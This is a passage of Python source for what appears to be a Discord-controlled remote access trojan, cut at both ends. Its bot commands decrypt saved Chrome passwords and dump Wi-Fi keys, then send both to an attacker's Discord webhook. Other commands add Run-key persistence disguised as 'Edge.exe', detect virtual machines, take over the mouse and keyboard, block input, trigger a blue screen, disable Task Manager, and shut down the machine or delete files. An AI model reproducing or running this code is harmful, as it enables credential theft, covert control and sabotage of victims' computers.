@bot.command(name="chromecred", pass_ctx=True)
async def chromecred(ctx):
    command = ctx.message.content.replace("!chromecred", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID): 
        try:
            import os
            path = fr'"C:\Users\{usr}\.config\Chrome"'
            new_path = path[1:]
            new_path = new_path[:-1]
            os.mkdir(new_path)  

            def get_chrome_datetime(chromedate):
                """Return a `datetime.datetime` object from a chrome format datetime
                Since `chromedate` is formatted as the number of microseconds since January, 1601"""
                return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

            def get_encryption_key():
                local_state_path = os.path.join(os.environ["USERPROFILE"],
                                                "AppData", "Local", "Google", "Chrome",
                                                "User Data", "Local State")
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)

                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                key = key[5:]
                return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

            def decrypt_password(password, key):
                try:
                    iv = password[3:15]
                    password = password[15:]
                    cipher = AES.new(key, AES.MODE_GCM, iv)

                    return cipher.decrypt(password)[:-16].decode()
                except:
                    try:
                        return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                    except:
                        return ""
            def main():
                key = get_encryption_key()

                db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                        "Google", "Chrome", "User Data", "default", "Login Data")
                filename = "ChromeData.db"
                shutil.copyfile(db_path, filename)
                db = sqlite3.connect(filename)
                cursor = db.cursor()
                cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
                for row in cursor.fetchall():
                    origin_url = row[0]
                    action_url = row[1]
                    username = row[2]
                    password = decrypt_password(row[3], key)
                    date_created = row[4]
                    date_last_used = row[5]        
                    if username or password:
                        print(f"Origin URL: {origin_url}", file=open(fr"c:\Users\{usr}\.config\Chrome\ChromeCred.txt", "a"))
                        print(f"Action URL: {action_url}", file=open(fr"c:\Users\{usr}\.config\Chrome\ChromeCred.txt", "a"))
                        print(f"Username: {username}", file=open(fr"c:\Users\{usr}\.config\Chrome\ChromeCred.txt", "a"))
                        print(f"Password: {password}", file=open(fr"c:\Users\{usr}\.config\Chrome\ChromeCred.txt", "a"))
                    else:
                        continue
                    if date_created != 86400000000 and date_created:
                        print(f"Creation date: {str(get_chrome_datetime(date_created))}", file=open(fr"c:\Users\{usr}\.config\Chrome\ChromeCred.txt", "a"))
                    if date_last_used != 86400000000 and date_last_used:
                        print(f"Last Used: {str(get_chrome_datetime(date_last_used))}", file=open(fr"c:\Users\{usr}\.config\Chrome\ChromeCred.txt", "a"))
                    print("="*50, file=open(fr"c:\Users\{usr}\.config\Chrome\ChromeCred.txt", "a"))
                cursor.close()
                db.close()
                try:
                    os.system("del ChromeData.db")
                except:
                    pass
            main()

            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Was Able To Extract Chrome Credentials From: {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()

            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID, content=f"Succesfull Grabbed Chrome History from: {usr} #{ID}")
            with open(fr"c:\Users\{usr}\.config\Chrome\ChromeCred.txt", "rb") as f:
                webhook.add_file(file=f.read(), filename='ChromePw.txt')
            response = webhook.execute()

            path_chrome = fr"c:\Users\{usr}\.config\Chrome"
            shutil.rmtree(path_chrome)

        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed to Extract Chrome Credentials From:  {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()            

@bot.command(name="taskkill", pass_ctx=True)
async def taskill(ctx):
    command = ctx.message.content.replace("!taskkill", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID): 
        try:
            path_kill = check_id[1]
            kill_proc = subprocess.Popen(f"taskkill /F /IM {path_kill}", stderr=subprocess.PIPE, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, shell=True, text=True, creationflags=0x08000000)
            comand, err = kill_proc.communicate()
            kill_proc.wait()
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Tried To Kill: {path_kill} on:  {usr} #{ID}**", description=None, color='429bf5')
            webhook.add_embed(embed)
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed to Kill: {path_kill} on:  {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()  

@bot.command(name="wifipw", pass_ctx=True)
async def wifipw(ctx):
    command = ctx.message.content.replace("!wifipw", "")
    check_id = command.split()
    path_wifi_pw = fr"c:\Users\{usr}\.config\wifipw.txt"
    if int(check_id[0]) == int(ID): 
        try:
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
            profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
            print("Executed..", file=open(path_wifi_pw, "w"))
            print("Grabbed Passwords: ", file=open(path_wifi_pw, "a"))
            print("-"*50, file=open(path_wifi_pw, "a"))
            for i in profiles:
                try:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                    try:
                        print('', file=open(path_wifi_pw, "a"))
                        print ("{:<30}|  {:<}".format(i, results[0]), file=open(path_wifi_pw, "a"))
                        print("-"*50, file=open(path_wifi_pw, "a"))
                    except IndexError:
                        print ("{:<30}|  {:<}".format(i, ""), file=open(path_wifi_pw, "a"))
                except subprocess.CalledProcessError:
                    print ("{:<30}|  {:<}".format(i, "ENCODING ERROR"), file=open(path_wifi_pw, "a"))
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID, content=f"Grabbed Wifi Passwords From: {usr} #{ID}")
            with open(path_wifi_pw, "rb") as f:
                webhook.add_file(file=f.read(), filename="WifiPassword.txt")
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed to Grab Passwords From:  {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()  

@bot.command(name="camcount", pass_ctx=True)
async def chromecred(ctx):
    command = ctx.message.content.replace("!camcount", "")
    check_id = command.split()
    camcount = fr"c:\Users\{usr}\.config\camcount.txt"
    if int(check_id[0]) == int(ID): 
        try:
            def cam():
                print("Executed.. ", file=open(camcount, "w"))
                print("Available Cams: ", file=open(camcount, "a"))
                print("-"*25, file=open(camcount, "a"))
                def clearCapture(capture):
                    capture.release()
                    cv2.destroyAllWindows()

                def countCameras():
                    n = 0
                    for i in range(10):
                        try:
                            cap = cv2.VideoCapture(i)
                            ret, frame = cap.read()
                            cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
                            clearCapture(cap)
                            n += 1
                        except:
                            clearCapture(cap)
                            break
                    return n
                print(countCameras(), file=open(camcount, "a"))
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID, content=f"Available Cams On : {usr} #{ID}")
                with open(camcount, "rb") as f:
                    webhook.add_file(file=f.read(), filename="cams.txt")
                response = webhook.execute()

            cami = threading.Thread(target=cam)
            cami._running = True
            cami.daemon = True
            cami.start()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed to Count Cams On:  {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()  

@bot.command(name="usbcheck", pass_ctx=True)
async def usbcheck(ctx):
    command = ctx.message.content.replace("!usbcheck", "")
    check_id = command.split()
    path_usb = fr"c:\Users\{usr}\.config\usb.txt"
    if int(check_id[0]) == int(ID):
        try:
            print("Executed", file=open(path_usb, "w"))
            print("-"*50, file=open(path_usb, "a"))
            wmi = win32com.client.GetObject ("winmgmts:")
            for usb in wmi.InstancesOf ("Win32_USBHub"):
                print(usb.DeviceID, file=open(path_usb, "a"))
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID, content=f"Successfull Checked USB From: {usr} #{ID}")
            with open(path_usb, "rb") as f:
                    webhook.add_file(file=f.read(), filename='usb.txt')
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed To Check USB From: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="persist", pass_ctx=True)
async def persist(ctx):
    command = ctx.message.content.replace("!persist", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            import os
            path_persist = fr'"{tmp}\Config"'
            new_path = path_persist[1:]
            new_path = new_path[:-1]
            os.mkdir(new_path) 
            path_persist_exe = fr"{tmp}\Config\Edge.exe"
            if not os.path.exists(path_persist):
                shutil.copyfile(sys.executable, path_persist_exe)
                subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Edge /t REG_SZ /d "' + path_persist_exe + '" /f', shell=True)
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"Successfull Created Persistance **reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Edge /t REG_SZ /d {path_persist_exe} /f**:  {usr} #{ID}", description=None, color='09e30d')
                webhook.add_embed(embed)
                response = webhook.execute()

        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed to Create Persistance {e}**", description=None, color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="persistcheck", pass_ctx=True)
async def persistcheck(ctx):
    command = ctx.message.content.replace("!persistcheck", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            import os
            path_persist_exe = fr"{tmp}\Config\Edge.exe"
            if os.path.exists(path_persist_exe):
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**Persistance Enabled On: {usr} #{ID}**", description=None, color='09e30d')
                webhook.add_embed(embed)
                response = webhook.execute()
            else:
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**No Persistance On: {usr} #{ID}**", description=None, color='ff0000')
                webhook.add_embed(embed)
                response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed to Check Persistance {e}**", description=None, color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="persistdelete", pass_ctx=True)
async def persistdelete(ctx):
    command = ctx.message.content.replace("!persistdelete", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            import os
            path_persist_exe = fr"{tmp}\Config"
            if os.path.exists(path_persist_exe):
                shutil.rmtree(path_persist_exe)
            
            subprocess.call("reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Edge /f", shell=True)
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Persistance Successfull Deleted On: {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed to Delete Persistance {e} On: {usr} #{ID}**", description=None, color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="mkdir", pass_ctx=True)
async def mkdir(ctx):
    command = ctx.message.content.replace("!mkdir", "")
    check_id = command.split()
    path_create_dir = check_id[1]
    if int(check_id[0]) == int(ID):
        try:
            import os
            os.mkdir(path_create_dir)
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Successfull Created Dir: {path_create_dir} On: {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed To Create Dir: {path_create_dir} On: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="reboot", pass_ctx=True)
async def reboot(ctx):
    command = ctx.message.content.replace("!reboot", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            import os
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Successfull Rebooted: {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
            os.system("shutdown -t 0 -r -f")
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed To Reboot: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="shutdown", pass_ctx=True)
async def shutdown(ctx):
    command = ctx.message.content.replace("!shutdown", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            import os
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Successfull Shutdown: {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
            os.system("shutdown /s /t 0")
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed To Shutdown: {usr} #{ID}  {e}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="vm", pass_ctx=True)
async def vm(ctx):
    command = ctx.message.content.replace("!vm", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            rules = ['Virtualbox', 'vmbox', 'vmware']
            command = subprocess.Popen("SYSTEMINFO | findstr  \"System Info\"", stderr=subprocess.PIPE,
                                        stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, shell=True, text=True,
                                        creationflags=0x08000000)
            out, err = command.communicate()
            command.wait()
            for rule in rules:
                if re.search(rule, out, re.IGNORECASE):
                    embed = DiscordEmbed(title=f"**Client IS VM!!: {usr} #{ID}**", description=None, color='ff0000')
                    webhook.add_embed(embed)
                    response = webhook.execute()
            embed = DiscordEmbed(title=f"**Client: {usr} #{ID} IS NOT A VM!!!**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed To Check For VM: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="wcd", pass_ctx=True)
async def working_dir(ctx):
    command = ctx.message.content.replace("!wcd", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            import os
            working_dir = os.getcwd()
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Successfull Executed On: {usr} #{ID}**", description=f"{working_dir}", color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed To Get Working Dir On: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="allproc", pass_ctx=True)
async def proc(ctx):
    command = ctx.message.content.replace("!allproc", "")
    check_id = command.split()
    path_proc = fr"c:\Users\{usr}\.config\runningproc.txt"
    if int(check_id[0]) == int(ID):
        try:
            import os
            output = os.popen('wmic process get description, processid').read()
            print(output, file=open(path_proc, "w"))
            with open(path_proc, "r+") as runningProc:
                proc = runningProc.read()
                if len(proc) > 4000:
                    webhook = DiscordWebhook(url=COMMAND_CONTROL_ID, content=f"Successfull Got Processes From: {usr} #{ID}")
                    with open(path_proc, "rb") as f:
                        webhook.add_file(file=f.read(), filename='proc.txt')
                    response = webhook.execute()
                else:
                    webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                    embed = DiscordEmbed(title=f"**Successfull Got Processes From: {usr} #{ID}**", description=f"{proc}", color='09e30d')
                    webhook.add_embed(embed)
                    response = webhook.execute()


        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed To Get Current Running Processes On: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="showerror", pass_ctx=True)
async def error(ctx):
    command = ctx.message.content.replace("!showerror", "")
    check_id = command.split()
    title = check_id[1]
    mess = check_id[2]
    if int(check_id[0]) == int(ID):
        try:
            def tkintererror():
                tkinter.messagebox.showerror(title=title, message=mess)

            tkerror = threading.Thread(target=tkintererror)
            tkerror._running = True
            tkerror.daemon = True
            tkerror.start()
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Error Successfull Displayed With: Title: {title} Message: {mess}: {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute() 
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed Display Error: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="mousemove", pass_ctx=True)
async def mouse(ctx):
    command = ctx.message.content.replace("!mousemove", "")
    check_id = command.split()
    pyautogui.FAILSAFE = False
    if int(check_id[0]) == int(ID):
        try:
            click_event = check_id[1:]
            pyautogui.moveTo(click_event, duration=0)
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Successfull Moved Mouse To {click_event} On: {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Error While Moving Mouse On: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="mouseclick", pass_ctx=True)
async def mouse(ctx):
    command = ctx.message.content.replace("!mouseclick", "")
    check_id = command.split()
    pyautogui.FAILSAFE = False
    if int(check_id[0]) == int(ID):
        try:
            click_event = check_id[1:]
            pyautogui.click(click_event)
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Successfull Clicked On: {click_event} Mouse On: {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Error While Clicking On: {click_event} Mouse On: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="mousedoubleclick", pass_ctx=True)
async def mouse(ctx):
    command = ctx.message.content.replace("!mousedoubleclick", "")
    check_id = command.split()
    pyautogui.FAILSAFE = False
    if int(check_id[0]) == int(ID):
        try:
            click_event = check_id[1:]
            pyautogui.click(click_event, clicks=2)
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Successfull Clicked On: {click_event} Mouse On: {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Error While Clicking On: {click_event} Mouse On: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="key", pass_ctx=True)
async def keyboard(ctx):
    command = ctx.message.content.replace("!key", "")
    check_id = command.split()
    pyautogui.FAILSAFE = False
    if int(check_id[0]) == int(ID):
        try:
            key_event = check_id[1]
            pyautogui.press(key_event)
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Successfull Clicked On: {key_event} Mouse On: {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Error While Clicking On: {key_event} Mouse On: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="morekey", pass_ctx=True)
async def keyboard(ctx):
    command = ctx.message.content.replace("!morekey", "")
    check_id = command.split()
    pyautogui.FAILSAFE = False
    if int(check_id[0]) == int(ID):
        try:
            key_event = check_id[1:]
            pyautogui.press(key_event)
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Successfull Clicked: {key_event} Mouse On: {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Error While Clicking: {key_event} Mouse On: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="displayoff", pass_ctx=True)
async def display(ctx):
    command = ctx.message.content.replace("!displayoff", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                WM_SYSCOMMAND = 274
                HWND_BROADCAST = 65535
                SC_MONITORPOWER = 61808
                ctypes.windll.user32.BlockInput(True)
                ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**Successfull set Display Off From: {usr} #{ID}**", description=None, color='09e30d')
                webhook.add_embed(embed)
                response = webhook.execute()
            else:
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**No Admin Rights on: {usr} #{ID}**", description=None, color='ff0000')
                webhook.add_embed(embed)
                response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed To Set Display Off From: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()

@bot.command(name="displayon", pass_ctx=True)
async def display(ctx):
    command = ctx.message.content.replace("!displayon", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                keyboard = Controller()
                keyboard.press(Key.esc)
                keyboard.release(Key.esc)
                keyboard.press(Key.esc)
                keyboard.release(Key.esc)
                ctypes.windll.user32.BlockInput(False)
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**Successfull Turned Screen On From: {usr} #{ID}**", description=None, color='09e30d')
                webhook.add_embed(embed)
                response = webhook.execute()
            else:
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**No Admin Rights on: {usr} #{ID}**", description=None, color='ff0000')
                webhook.add_embed(embed)
                response = webhook.execute()
        except Exception as e:
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**Failed To Kill Display From: {usr} #{ID}**", description=f"{e}", color='ff0000')
                webhook.add_embed(embed)
                response = webhook.execute()

@bot.command(name="bluescreen", pass_ctx=True)
async def bluescreen(ctx):
    command = ctx.message.content.replace("!bluescreen", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Trying To Bluescreen: {usr} #{ID}**", description="**If Connection is Lost That Means It worked..**", color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
        except Exception as e:
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**Failed To Bluescreen: {usr} #{ID}**", description=f"{e}", color='ff0000')
                webhook.add_embed(embed)
                response = webhook.execute()

@bot.command(name="taskmanageroff", pass_ctx=True)
async def taskmgr(ctx):
    command = ctx.message.content.replace("!taskmanageroff", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                global statuuusss
                statuuusss = None
                import os
                instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'
                def shell():
                    output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    global status
                    statuuusss = "ok"
                    return output
                import threading
                shel = threading.Thread(target=shell)
                shel._running = True
                shel.start()
                time.sleep(1)
                shel._running = False
                result = str(shell().stdout.decode('CP437'))
                if len(result) <= 5:
                    import winreg as reg
                    reg.CreateKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                    import os
                    os.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
                else:
                    import os
                    os.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**Successfull Disabled Taskmgr On: {usr} #{ID}**", description=None, color='09e30d')
                webhook.add_embed(embed)
                response = webhook.execute()
            else:
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**No Admin Rights on: {usr} #{ID}**", description=None, color='ff0000')
                webhook.add_embed(embed)
                response = webhook.execute()
        except Exception as e:
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**Failed To Disable Taskmgr On: {usr} #{ID}**", description=f"{e}", color='ff0000')
                webhook.add_embed(embed)
                response = webhook.execute()

@bot.command(name="taskmanageron", pass_ctx=True)
async def taskmgr(ctx):
    command = ctx.message.content.replace("!taskmanageron", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                import os
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:
                    global statusuusss
                    import time
                    statusuusss = None
                    import subprocess
                    import os
                    instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'
                    def shell():
                        output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        global status
                        statusuusss = "ok"
                        return output
                    import threading
                    shel = threading.Thread(target=shell)
                    shel._running = True
                    shel.start()
                    time.sleep(1)
                    shel._running = False
                    result = str(shell().stdout.decode('CP437'))
                    if len(result) <= 5:
                        webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                        embed = DiscordEmbed(title=f"**Successfull Enabled Taskmgr On: {usr} #{ID}**", description=None, color='09e30d')
                        webhook.add_embed(embed)
                        response = webhook.execute()  
                    else:
                        import winreg as reg
                        reg.DeleteKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                        webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                        embed = DiscordEmbed(title=f"**Successfull Enabled Taskmgr On: {usr} #{ID}**", description=None, color='09e30d')
                        webhook.add_embed(embed)
                        response = webhook.execute()  
            else:
                webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
                embed = DiscordEmbed(title=f"**No Admin Rights on: {usr} #{ID}**", description=None, color='ff0000')
                webhook.add_embed(embed)
                response = webhook.execute()
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed To Enable Taskmgr: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed)
            response = webhook.execute()           

@bot.command(name="remove", pass_ctx=True)
async def remove(ctx):
    command = ctx.message.content.replace("!remove", "")
    check_id = command.split()
    delete_event = check_id[1]
    if int(check_id[0]) == int(ID):
        try:
            def delete():
                import os
                del_event = f"del {delete_event}"
                os.system(del_event) 
            rm = threading.Thread(target=delete)
            rm._running = True
            rm.daemon = True
            rm.start()
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Successfull Removed File: {delete_event} On: {usr} #{ID}**", description=None, color='09e30d')
            webhook.add_embed(embed)
            response = webhook.execute()  
        except Exception as e:
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
            embed = DiscordEmbed(title=f"**Failed To Remove {delete_event} On: {usr} #{ID}**", description=f"{e}", color='ff0000')
            webhook.add_embed(embed) 
            response = webhook.execute()

@bot.command(name="window", pass_ctx=True)
async def remove(ctx):
    command = ctx.message.content.replace("!window", "")
    check_id = command.split()
    if int(check_id[0]) == int(ID):
        try:
            current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            webhook = DiscordWebhook(url=COMMAND_CONTROL_ID)
